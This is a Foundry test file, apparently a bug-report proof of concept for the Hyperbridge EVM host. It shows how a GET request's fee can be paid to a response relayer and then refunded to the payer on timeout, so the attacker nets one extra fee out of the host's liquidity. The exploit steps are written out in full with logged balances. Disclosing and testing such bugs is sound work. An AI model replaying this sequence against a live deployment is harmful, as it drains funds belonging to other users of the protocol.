// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "./BaseTest.sol";
import "./TestDispatcher.sol";

import {DispatchGet} from "@hyperbridge/core/interfaces/IDispatcher.sol";
import {FeeMetadata} from "@hyperbridge/core/interfaces/IHost.sol";
import {GetRequest, GetResponse, Message} from "@hyperbridge/core/libraries/Message.sol";
import {GetRequestTimeout} from "@hyperbridge/core/interfaces/IApp.sol";
import {StateMachine} from "@hyperbridge/core/libraries/StateMachine.sol";
import {StorageValue} from "@polytope-labs/solidity-merkle-trees/src/trie/Node.sol";

contract EvmHostGetResponseTimeoutPoC is BaseTest {
    using Message for GetRequest;

    function testPoC_GetResponseThenTimeoutPaysAndRefundsSameFee() public {
        console2.log("=== Hyperbridge EVM GET response -> timeout double fee PoC ===");

        TestDispatcher app = new TestDispatcher(address(0));
        app.setIsmpHost(address(host), address(0));

        uint256 fee = 10 ether;
        address responseRelayer = address(0xBEEF);
        address timeoutRelayer = address(0xCAFE);

        feeToken.mint(address(app), fee);

        bytes[] memory keys = new bytes[](1);
        keys[0] = hex"abcd";

        uint64 timeoutDuration = 1;
        DispatchGet memory get = DispatchGet({dest: StateMachine.evm(421614), height: 100, keys: keys, context: hex"1234", timeout: timeoutDuration, fee: fee, payer: address(app)});

        console2.log("Step 1: app dispatches GET with fee");
        console2.log("fee amount:", fee);
        console2.log("app balance before dispatch:", feeToken.balanceOf(address(app)));
        console2.log("host balance before dispatch:", feeToken.balanceOf(address(host)));
        console2.log("response relayer balance before:", feeToken.balanceOf(responseRelayer));

        uint256 attackerCombinedBefore = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
        console2.log("attacker combined balance before:", attackerCombinedBefore);

        vm.prank(address(app));
        bytes32 commitment = host.dispatch(get);

        GetRequest memory request = GetRequest({source: host.host(), dest: get.dest, nonce: 0, from: abi.encodePacked(address(app)), timeoutTimestamp: uint64(block.timestamp) + timeoutDuration, keys: keys, height: get.height, context: get.context});

        assertEq(request.hash(), commitment, "sanity: reconstructed request commitment");
        assertEq(host.requestCommitments(commitment).fee, fee, "request fee stored before response");

        console2.log("commitment:");
        console2.logBytes32(commitment);
        console2.log("app balance after dispatch:", feeToken.balanceOf(address(app)));
        console2.log("host balance after dispatch:", feeToken.balanceOf(address(host)));
        console2.log("stored request fee:", host.requestCommitments(commitment).fee);

        StorageValue[] memory values = new StorageValue[](1);
        values[0] = StorageValue({key: keys[0], value: hex"01"});

        GetResponse memory response = GetResponse({request: request, values: values});

        console2.log("Step 2: handler delivers GET response; response relayer gets paid");

        vm.prank(host.hostParams().handler);
        host.dispatchIncoming(response, responseRelayer);

        console2.log("response relayer balance after response:", feeToken.balanceOf(responseRelayer));

        uint256 attackerCombinedAfterResponse = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
        console2.log("attacker combined balance after response:", attackerCombinedAfterResponse);
        console2.log("host balance after response:", feeToken.balanceOf(address(host)));
        console2.log("local response receipt relayer:", host.responseReceipts(commitment).relayer);
        console2.log("BUG: request commitment fee still live after response:", host.requestCommitments(commitment).fee);

        assertEq(feeToken.balanceOf(responseRelayer), fee, "response relayer was paid");
        assertEq(host.requestCommitments(commitment).fee, fee, "BUG: request commitment remains live after response");
        assertEq(host.responseReceipts(commitment).relayer, responseRelayer, "response receipt exists");

        console2.log("Step 3: add unrelated host balance, then process timeout");
        console2.log("This models other protocol/user fee-token liquidity in host.");

        feeToken.mint(address(host), fee);

        uint256 appBeforeTimeout = feeToken.balanceOf(address(app));
        uint256 hostBeforeTimeout = feeToken.balanceOf(address(host));

        console2.log("app balance before timeout refund:", appBeforeTimeout);
        console2.log("host balance before timeout refund:", hostBeforeTimeout);

        FeeMetadata memory meta = host.requestCommitments(commitment);

        vm.prank(host.hostParams().handler);
        host.dispatchTimeOut(GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment);

        console2.log("Step 4: timeout completed");
        console2.log("app balance after timeout refund:", feeToken.balanceOf(address(app)));
        console2.log("host balance after timeout refund:", feeToken.balanceOf(address(host)));
        console2.log("response relayer still paid:", feeToken.balanceOf(responseRelayer));

        uint256 attackerCombinedAfter = feeToken.balanceOf(address(app)) + feeToken.balanceOf(responseRelayer);
        console2.log("attacker combined balance after timeout:", attackerCombinedAfter);
        console2.log("attacker net gain from host liquidity:", attackerCombinedAfter - attackerCombinedBefore);

        assertEq(attackerCombinedBefore, fee, "attacker starts with one fee amount");
        assertEq(attackerCombinedAfter, fee * 2, "attacker ends with two fee amounts");
        assertEq(attackerCombinedAfter - attackerCombinedBefore, fee, "attacker gains one fee from host liquidity");
        console2.log("request commitment sender after timeout:", host.requestCommitments(commitment).sender);

        assertEq(feeToken.balanceOf(address(app)), appBeforeTimeout + fee, "BUG: original payer was refunded after response relayer was already paid");

        assertEq(host.requestCommitments(commitment).sender, address(0), "timeout finally deletes stale commitment");

        console2.log("RESULT: same GET fee was paid to response relayer and later refunded to payer");
        console2.log("RESULT: attacker-controlled combined balance increased from one fee to two fees");
    }
}
